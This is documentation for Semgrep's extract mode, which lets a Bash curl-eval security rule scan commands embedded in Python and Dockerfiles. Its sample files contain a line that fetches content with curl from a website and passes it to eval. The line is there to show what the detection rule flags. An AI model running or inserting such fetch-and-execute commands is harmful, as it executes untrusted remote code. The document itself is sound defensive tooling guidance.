---
id: extract-mode
append_help_link: true
description: "This article explains the extract mode, which allows for easier handling of files containing more than one language."
---

# Extract mode

## Introduction

Extract mode enables you to run existing rules on subsections of files where the rule language is different than the language of the file. For example, running a Javascript rule on code contained inside of script tags in an HTML document.

## Example of extract mode

Without extract mode, writing rules to validate template, Markdown or configuration files which contain code in another language can be burdensome and require significant rule duplication.

Let's take the following Bash rule as an example (a simplified version of [our `curl-eval` rule](https://github.com/returntocorp/semgrep-rules/blob/release/bash/curl/security/curl-eval.yaml)):

```yaml
rules:
  - id: curl-eval
    severity: WARNING
    languages:
      - bash
    message: Evaluating data from a `curl` command is unsafe.
    mode: taint
    pattern-sources:
      - pattern: |
          $(curl ...)
      - pattern: |
          `curl ...`
    pattern-sinks:
      - pattern: eval ...
```

Usually, this rule would only be run against Bash files. However, our project might contain Dockerfiles or Python scripts which invoke Bash commands&mdash;this rule won't currently be run against any Bash contained in those files.

However, with extract mode we can supplement our Bash rule with instructions on how to extract any Bash commands we might be using in a Docker `RUN` instruction or via Python's `os.system` standard library function.

```yaml
rules:
  - id: extract-docker-run-to-bash
    mode: extract
    languages:
      - dockerfile
    pattern: RUN $...CMD
    extract: $...CMD
    dest-language: bash
  - id: extract-python-os-system-to-bash
    mode: extract
    languages:
      - python
    pattern: os.system("$CMD")
    extract: $CMD
    dest-language: bash
```

By adding the above extract mode rules, Semgrep matches the below Python file, reporting the contained Bash as matching with the `curl-eval` rule.

```python
from os import system

if system('eval `curl -s "http://www.very-secure-website.net"`'):
    print("Command failed!")
else:
    print("Success")
```

Likewise, if our query included a Dockerfile such as the example below Semgrep would match the contained Bash and report a match with the `curl-eval` rule.

```dockerfile
FROM fedora
RUN dnf install -y unzip zip curl which
RUN eval `curl -s "http://www.very-secure-website.net"`
```

## Extract mode rule schema

Extract mode rules **require** the following usual Semgrep rule keys:
  - `id`
  - `languages`
  - One of `pattern`, `patterns`, `pattern-either`, or `pattern-regex`

Extract mode rules **also require** two additional fields:
  - `extract`
  - `dest-language`

The extract mode specific fields are further explained in two sections below.

### `extract`

The `extract` key is required when in extract mode. The value must be a metavariable appearing in your pattern(s), and the value bound to that metavariable will be extracted.

### `dest-language`

The `dest-language` key is required when in extract mode. The value must be a [language tag](../../writing-rules/rule-syntax/#language-extensions-and-tags) other than `generic`.


## Limitations of extract mode

Currently, extract mode does not support additional processing for the extracted text, such as unescaping strings, which might be useful for some applications like Jupyter Notebooks.

While extract mode can help to enable rules which try and track taint across a language boundary within a file, taint rules cannot have a source and sink split across the original file and extracted text.
